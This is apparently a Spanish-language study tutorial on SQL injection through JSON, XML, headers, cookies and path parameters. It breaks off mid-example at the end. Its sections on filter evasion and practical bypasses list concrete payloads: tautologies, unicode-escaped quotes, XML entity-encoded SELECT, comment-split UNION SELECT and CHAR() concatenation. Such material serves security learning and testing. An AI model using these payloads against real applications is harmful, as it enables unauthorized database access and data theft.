# SQL injection en diferentes contextos (JSON, XML, headers, APIs)

Las inyecciones SQL no se limitan al query string. Cualquier entrada controlable por el usuario que termine formando una consulta SQL puede ser vector de inyección: JSON, XML, cabeceras, cookies, segmentos de URL, multipart, GraphQL, etc. Diferentes formatos ofrecen formas alternativas de ocultar o evadir filtros, y a menudo requieren técnicas de explotación y evasión específicas.

[Obfuscating](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding)

---

## 1) Idea clave

La vulnerabilidad aparece cuando la aplicación **construye o interpola** una consulta SQL usando datos controlados externamente sin usar **consultas parametrizadas**  o validación estricta. El formato del dato (JSON, XML, header) sólo cambia la forma en que el payload debe llegar y cómo la app lo decodifica antes de pasarlo al motor SQL.

---

## 2) Contextos comunes y ejemplos

### A — Query string / form data

* GET: `/product?id=123` → `SELECT * FROM products WHERE id = '123'`.
* POST form: `product=123` similar.

### B — JSON

* Petición JSON típica:

  ```json
  { "productId": 123, "filter": "recent" }
  ```
* Si el backend hace algo peligroso como: `query = "SELECT * FROM products WHERE id = '" + data.productId + "'";`, aceptará payloads JSON que incluyan comillas o estructuras.
* **Ejemplo de inyección JSON**: si `productId` no se valida: `{ "productId": "1' OR '1'='1" }` → `... WHERE id = '1' OR '1'='1'`.

### C — XML

* XML puede usar **escape sequences** o **entidades**:

  ```xml
  <stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
  </stockCheck>
  ```

  El parser XML decodifica `&#x53;` a `S`, resultando en `SELECT` en el SQL final.
* También se puede abusar de **CDATA** y XXE para OOB exfiltration (cuando el XML es parseado y convertido a SQL después).

### D — Headers, Cookies y Path params

* `User-Agent`, `Referer`, `X-Forwarded-For`, o cookies pueden ser usados para inyección si son concatenados en SQL.
* Ejemplo: app registra `INSERT INTO access_log (ua) VALUES ('<User-Agent>')` → inyectá en `User-Agent`.
* Segmentos RESTful: `/user/123/orders` → si la app hace `WHERE user_id = '123'` usando el segmento, ese valor también puede explotar.

### E — Multipart / file metadata

* Formularios multipart incluyen campos de texto que pueden inyectarse. Metadatos de filenames también.

---

## 3) Por qué los formatos ayudan a evadir filtros (WAF, regex simples)

* Muchos filtros buscan palabras clave comunes (`SELECT`, `UNION`, `DROP`) en la entrada cruda. Si el formato (ej. JSON/XML) **decodifica** entidades o escape sequences antes de ejecutar SQL, un payload codificado puede pasar el filtro y luego ser interpretado por el servidor.
* Ejemplos de evasión:

  * **Escapes HTML / XML**: `&#x53;ELECT` → `SELECT` tras parseo XML.
  * **URL encoding / percent encoding** en parámetros.
  * **Unicode homoglyphs / UTF-8 overlong** (poco fiable y detectable).
  * **Insertar comentarios** dentro de palabras clave: `SE/**/LECT`.
  * **Separar la palabra clave**: `SE` + `LECT` (si la app concatena input de varias fuentes).
  * **Uso de concatenación del motor**: `CHAR(83)+'ELECT'` (en SQL Server) o `CHR(83)||'ELECT'` (Oracle) para producir `SELECT` internamente.

---

## 4) Ejemplos prácticos de bypass

> Ajustar comillas y encoding según el contexto (JSON string, XML text, header).

* **JSON (body)**

  ```json
  { "id": "1' OR '1'='1" }
  ```

* **JSON con encoding** (si parser decodes):

  ```json
  { "q": "1\u0027 OR \u00271\u0027=\u00271" }
  ```

  (`\u0027` = `'`) puede evadir filtros que no normalizan unicode.

* **XML escape example**

  ```xml
  <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
  ```

  (XML decode → `SELECT`)

* **Split keyword with comments**

  ```sql
  ' UN/**/ION SEL/**/ECT NULL,NULL--
  ```

* **Hex / CHAR functions** (MSSQL)

  ```sql
  ' UNION SELECT CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84) --
  ```

* **Concatenate pieces from different JSON fields**
  Si un backend hace `q = body.a + body.b`, envía `{"a":"SE
